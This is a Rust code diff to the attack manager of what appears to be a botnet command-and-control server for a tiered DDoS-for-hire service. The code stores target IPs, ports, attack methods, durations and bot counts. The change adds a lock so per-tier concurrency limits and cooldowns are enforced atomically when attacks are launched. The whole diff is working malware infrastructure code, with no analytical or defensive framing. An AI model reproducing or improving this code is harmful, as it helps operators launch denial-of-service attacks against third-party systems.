@@ -53,6 +53,7 @@ pub struct AttackRequest {
     pub port: u16,
     pub duration_secs: u64,
     pub username: String,
+    pub user_level: Level,
     pub bot_count: usize,
     pub queued_at: Instant,
 }
@@ -65,6 +66,7 @@ pub struct AttackManager {
     cooldown_secs: u64,
     max_duration_secs: u64,
     user_last_attack: Arc<DashMap<String, Instant>>,
+    start_lock: Mutex<()>,
 }
 
 impl AttackManager {
@@ -77,10 +79,12 @@ impl AttackManager {
             cooldown_secs,
             max_duration_secs,
             user_last_attack: Arc::new(DashMap::new()),
+            start_lock: Mutex::new(()),
         }
     }
     
     pub async fn can_start_attack(&self, username: &str, user_level: Level) -> Result<(), String> {
+        // This method is now just a pre-check, actual enforcement happens in start_attack
         let count = self.attacks.len();
         
         // Check global limit
@@ -137,6 +141,7 @@ impl AttackManager {
         port: u16,
         duration_secs: u64,
         username: String,
+        user_level: Level,
         bot_count: usize,
     ) -> Result<usize, String> {
         // Validate duration
@@ -150,40 +155,98 @@ impl AttackManager {
             return Err(format!("Invalid attack method: {}", method));
         }
 
-        let ip_str = ip.to_string();
-        let now = chrono::Utc::now();
+        // Atomic check and reservation
+        {
+            let _lock = self.start_lock.lock().await;
+            
+            // Re-check limits inside lock
+            let count = self.attacks.len();
+            if count >= self.max_attacks {
+                return Err(format!("Maximum concurrent attacks reached: {}/{}", count, self.max_attacks));
+            }
+            
+            let user_attack_count = self.attacks.iter().filter(|a| a.username == username).count();
+            let max_user_attacks = match user_level {
+                Level::Owner => 10,
+                Level::Admin => 5,
+                Level::Pro => 3,
+                Level::Basic => 1,
+            };
+            
+            if user_attack_count >= max_user_attacks {
+                return Err(format!(
+                    "Maximum concurrent attacks for your level ({}): {}/{}",
+                    user_level.to_str(),
+                    user_attack_count,
+                    max_user_attacks
+                ));
+            }
+            
+            // Check cooldown
+            let cooldown_secs = match user_level {
+                Level::Owner => 0,
+                Level::Admin => self.cooldown_secs / 4,
+                Level::Pro => self.cooldown_secs / 2,
+                Level::Basic => self.cooldown_secs,
+            };
+            
+            if cooldown_secs > 0 {
+                if let Some(last_attack) = self.user_last_attack.get(&username) {
+                    let elapsed = last_attack.elapsed().as_secs();
+                    if elapsed < cooldown_secs {
+                        let remaining = cooldown_secs - elapsed;
+                        return Err(format!(
+                            "Attack cooldown active. Please wait {} seconds before starting another attack.",
+                            remaining
+                        ));
+                    }
+                }
+            }
+            
+            // If we are here, we are good to go.
+            // We hold the lock, so no one else can start an attack that would violate the limit.
+            // However, we are about to do an async DB insert.
+            // If we release the lock, someone else might jump in.
+            // But we can't hold the lock during DB insert if we want high throughput?
+            // Actually, for a CnC, throughput of *starting* attacks is low. Holding the lock is fine.
+            // But wait, `start_attack` is async. `Mutex` is `tokio::sync::Mutex`.
+            // So we can hold it across await.
+            
+            let ip_str = ip.to_string();
+            let now = chrono::Utc::now();
 
-        let id = sqlx::query("INSERT INTO attacks (username, target_ip, target_port, method, duration, started_at, status, bot_count) VALUES (?, ?, ?, ?, ?, ?, ?, ?)")
-            .bind(&username)
-            .bind(&ip_str)
-            .bind(port)
-            .bind(&method)
-            .bind(duration_secs as i64)
-            .bind(now)
-            .bind("running")
-            .bind(bot_count as i64)
-            .execute(&self.pool)
-            .await
-            .map_err(|e| format!("Database error: {}", e))?
-            .last_insert_rowid();
-        
-        let attack = Attack {
-            id,
-            method: method.clone(),
-            ip,
-            port,
-            duration: Duration::from_secs(duration_secs),
-            start: Instant::now(),
-            username: username.clone(),
-            bot_count,
-        };
-        
-        self.attacks.insert(id, attack);
-        
-        // Record this attack for user cooldown
-        self.user_last_attack.insert(username.clone(), Instant::now());
-        
-        Ok(id as usize)
+            let id = sqlx::query("INSERT INTO attacks (username, target_ip, target_port, method, duration, started_at, status, bot_count) VALUES (?, ?, ?, ?, ?, ?, ?, ?)")
+                .bind(&username)
+                .bind(&ip_str)
+                .bind(port)
+                .bind(&method)
+                .bind(duration_secs as i64)
+                .bind(now)
+                .bind("running")
+                .bind(bot_count as i64)
+                .execute(&self.pool)
+                .await
+                .map_err(|e| format!("Database error: {}", e))?
+                .last_insert_rowid();
+            
+            let attack = Attack {
+                id,
+                method: method.clone(),
+                ip,
+                port,
+                duration: Duration::from_secs(duration_secs),
+                start: Instant::now(),
+                username: username.clone(),
+                bot_count,
+            };
+            
+            self.attacks.insert(id, attack);
+            
+            // Record this attack for user cooldown
+            self.user_last_attack.insert(username.clone(), Instant::now());
+            
+            Ok(id as usize)
+        }
     }
     
     pub async fn queue_attack(
@@ -193,6 +256,7 @@ impl AttackManager {
         port: u16,
         duration_secs: u64,
         username: String,
+        user_level: Level,
         bot_count: usize,
     ) -> Result<usize, String> {
         // Validate duration
@@ -211,6 +275,7 @@ impl AttackManager {
             port,
             duration_secs,
             username,
+            user_level,
             bot_count,
             queued_at: Instant::now(),
         });
